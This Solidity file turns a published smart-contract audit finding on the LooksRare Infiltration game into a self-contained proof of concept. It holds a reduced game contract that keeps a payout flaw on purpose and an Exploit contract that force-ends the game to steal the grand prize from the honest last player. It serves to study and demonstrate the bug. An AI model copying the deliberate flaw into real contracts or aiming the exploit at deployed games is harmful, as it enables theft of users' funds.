// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    LooksRare "Infiltration" — [H-3] Attacker steals the grand prize by force
    ending the game (Sherlock 2023-10-looksrare-judging, finding #27588,
    reporter cergyk).

    SYNTHETIC, CHEATCODE-FREE reduction for the EVM Playground.

    Root cause: the game ends once `gameInfo.activeAgents == 1`
    (`startNewRound` reverts with `GameOver`), and `claimGrandPrize` pays the
    prize unconditionally to whoever owns `agents[1].agentId` — the agent
    stored at the FIXED array slot 1, regardless of whether that agent is
    still active:

        uint256 activeAgents = gameInfo.activeAgents;
        if (activeAgents == 1) { revert GameOver(); }        // @> VULN (startNewRound)
        ...
        uint256 agentId = agents[1].agentId;                 // @> VULN (claimGrandPrize)
        _assertAgentOwnership(agentId);

    An attacker who owns agent #1 (and many others) can `escape` every agent
    they own EXCEPT enough to leave exactly one OTHER player's agent as the
    sole still-active participant. `activeAgents` correctly becomes 1 (the
    real last player standing), the game correctly ends — but `claimGrandPrize`
    still reads the FIXED slot `agents[1]`, which is the attacker's own
    (already-escaped, inactive) agent. Because escaping does not change
    ownership, the attacker still owns agent #1 and can claim the prize meant
    for the actual last-standing player.
//////////////////////////////////////////////////////////////////////////*/

/// @notice Reduced Infiltration game. Keeps the verbatim vulnerable
///         `activeAgents == 1` end condition and the position-1-based
///         `claimGrandPrize` payout, which never re-checks that slot 1 is
///         still an ACTIVE agent.
contract Infiltration {
    struct Agent {
        uint256 agentId; // fixed at mint order, mirrors the real contract's array slot
        address owner;
        bool active; // false once escaped (or wounded/dead in the real game)
    }

    struct GameInfo {
        uint256 activeAgents;
    }

    error GameOver();
    error NotAgentOwner();

    mapping(uint256 => Agent) public agents; // position (== mint order) => Agent
    uint256 public agentCount;
    GameInfo public gameInfo;
    bool public prizeClaimed;
    uint256 public constant GRAND_PRIZE = 1000 ether;

    MockLooksToken public prizeToken;

    constructor(MockLooksToken _prizeToken) {
        prizeToken = _prizeToken;
    }

    function mint(address to) external returns (uint256 id) {
        agentCount += 1;
        id = agentCount;
        agents[id] = Agent({agentId: id, owner: to, active: true});
        gameInfo.activeAgents += 1;
    }

    /// @notice Verbatim reduction of Infiltration.escape
    ///         (Infiltration.sol#L656-L672). Escaping removes the agent from
    ///         the active headcount but leaves ownership untouched.
    function escape(uint256[] calldata agentIds) external {
        for (uint256 i; i < agentIds.length; i++) {
            uint256 id = agentIds[i];
            require(agents[id].owner == msg.sender, "not owner");
            if (agents[id].active) {
                agents[id].active = false;
                gameInfo.activeAgents -= 1;
            }
        }
    }

    /// @notice Verbatim reduction of the guard inside Infiltration.startNewRound
    ///         (Infiltration.sol#L589-L592) — the game force-ends the instant
    ///         only one agent remains active, with no separate confirmation of
    ///         who that agent is.
    function startNewRound() external view {
        uint256 activeAgents = gameInfo.activeAgents;
        // @> VULN: ends the game as soon as one agent is active, regardless of
        // whether other, wounded-but-not-escaped agents are still "in the game"
        // (see original finding); combined with claimGrandPrize below this lets
        // the wrong agent's owner claim the prize.
        if (activeAgents == 1) {
            revert GameOver();
        }
    }

    /// @notice Verbatim reduction of Infiltration.claimGrandPrize. Pays the
    ///         prize to whoever owns the agent parked at the FIXED slot 1 —
    ///         never checking that slot 1 is the agent that is actually still
    ///         active (the real last player standing).
    function claimGrandPrize() external {
        require(!prizeClaimed, "already claimed");
        require(gameInfo.activeAgents == 1, "game not over");
        uint256 agentId = agents[1].agentId; // @> VULN: winner determined by fixed slot 1, not by who is actually still active
        _assertAgentOwnership(agentId);
        prizeClaimed = true;
        prizeToken.mint(msg.sender, GRAND_PRIZE);
    }

    function _assertAgentOwnership(uint256 agentId) internal view {
        if (agents[agentId].owner != msg.sender) revert NotAgentOwner();
    }
}

/// @dev Minimal ERC20 used as the grand-prize token.
contract MockLooksToken {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }
}

/// @dev The honest player: mints one agent and never escapes it. This is the
///      agent that is ACTUALLY still active when the game ends.
contract HonestPlayer {
    function attemptClaim(Infiltration game) external returns (bool success) {
        (success, ) = address(game).call(abi.encodeWithSignature("claimGrandPrize()"));
    }
}

/// @notice Attacker orchestrator. Mints agent #1 (and many more) for itself,
///         mints ONE agent for the honest player, then escapes every agent it
///         owns EXCEPT enough to leave the honest player's agent as the sole
///         still-active participant — force-ending the game — and finally
///         claims the grand prize meant for the honest player.
contract Exploit {
    uint256 public constant ATTACKER_AGENTS_BEFORE = 5; // ids 1..5 (owned by attacker)
    uint256 public constant ATTACKER_AGENTS_AFTER = 5; // ids 7..11 (owned by attacker)
    uint256 public honestAgentId; // id 6, owned by the honest player

    MockLooksToken public prize; // nonce 1
    Infiltration public game; // nonce 2
    HonestPlayer public honestPlayer; // nonce 3

    constructor() {
        prize = new MockLooksToken(); // CREATE nonce 1
        game = new Infiltration(prize); // CREATE nonce 2
        honestPlayer = new HonestPlayer(); // CREATE nonce 3

        // Attacker mints agents 1..5 (LOW ids, includes the pivotal slot 1).
        for (uint256 i; i < ATTACKER_AGENTS_BEFORE; i++) {
            game.mint(address(this));
        }
        // Honest player mints agent 6 — the ONE agent that will remain active.
        honestAgentId = game.mint(address(honestPlayer));
        // Attacker mints agents 7..11 (HIGH ids) too, for good measure.
        for (uint256 i; i < ATTACKER_AGENTS_AFTER; i++) {
            game.mint(address(this));
        }
    }

    function run() external {
        uint256 activeBefore = game.gameInfo();
        require(activeBefore == 11, "setup: expected 11 minted agents");

        // Attacker escapes ALL of its own agents (1..5 and 7..11) — 10 ids —
        // leaving ONLY the honest player's agent (6) active.
        uint256[] memory escapeIds = new uint256[](10);
        for (uint256 i; i < 5; i++) {
            escapeIds[i] = i + 1; // 1..5
        }
        for (uint256 i; i < 5; i++) {
            escapeIds[5 + i] = 7 + i; // 7..11
        }
        game.escape(escapeIds);

        uint256 activeAfter = game.gameInfo();
        require(activeAfter == 1, "harm setup failed: game should be force-ended");

        // The game is now correctly over — the HONEST PLAYER's agent (6) is
        // the sole still-active participant.
        (, address activeOwner, bool activeFlag) = game.agents(honestAgentId);
        require(activeFlag, "honest player's agent should still be active");
        require(activeOwner == address(honestPlayer), "sanity: honest player owns the last active agent");

        // startNewRound now reverts (game over), confirming the force-end.
        (bool startReverted, ) = address(game).call(abi.encodeWithSignature("startNewRound()"));
        require(!startReverted, "startNewRound should have reverted (GameOver)");

        // The HONEST PLAYER (the true last player standing) cannot claim the
        // prize: agents[1].agentId is the ATTACKER's escaped agent, so the
        // ownership check fails for the honest player.
        bool honestClaimSucceeded = honestPlayer.attemptClaim(game);
        require(!honestClaimSucceeded, "harm not demonstrated: honest player could claim");

        // HARM: the ATTACKER claims the grand prize instead, even though its
        // own agent (#1) already escaped and the honest player's agent (#6)
        // was the actual sole remaining active participant.
        game.claimGrandPrize();
        require(prize.balanceOf(address(this)) == game.GRAND_PRIZE(), "attacker did not steal the grand prize");
    }
}
